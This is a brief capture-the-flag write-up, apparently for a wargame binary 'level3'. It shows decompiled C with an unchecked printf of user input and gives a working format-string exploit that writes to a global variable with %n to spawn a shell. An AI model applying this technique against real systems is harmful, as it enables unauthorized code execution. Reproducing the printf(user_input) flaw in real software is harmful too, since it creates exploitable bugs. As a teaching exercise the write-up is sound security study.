Here is the decompiled code :

```c
void v(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)

{
  v();
  return;
}
```
We can see that if the global variable m is equal to 0x40 (64 in decimal), it spawns a shell.

We also see that we have a buffer of 520 bytes long and a call to fgets which is protected against buffer overflow however, printf here is vulnarable to a format string exploit. Let's do that.

So first we explore where in the stack the buffer is :
```
./level3
aaaa %x %x %x %x
aaaa 200 e8aa7620 340 61616161
```

We see that our string aaaa is the 4th arg, (61616161 == "aaaa").
So if we input the address of `m` in the input, and write the correct value there thanks to printf %n format we can make m equal to 64.

It's important to remember that the 4th arg, where the address of m will be stored, is already 4 bytes long (because the address is 4 bytes long). So we need to write 60 bytes at that address to make it work.

The address of m is 0x0804988c.

Here is the command :
`(python -c 'print("\x8c\x98\x04\x08%60d%4$n")'; cat) | ./level3`
Composed of [ addr of m ] + [ write 60 bytes in the 4th arg ]

Done.
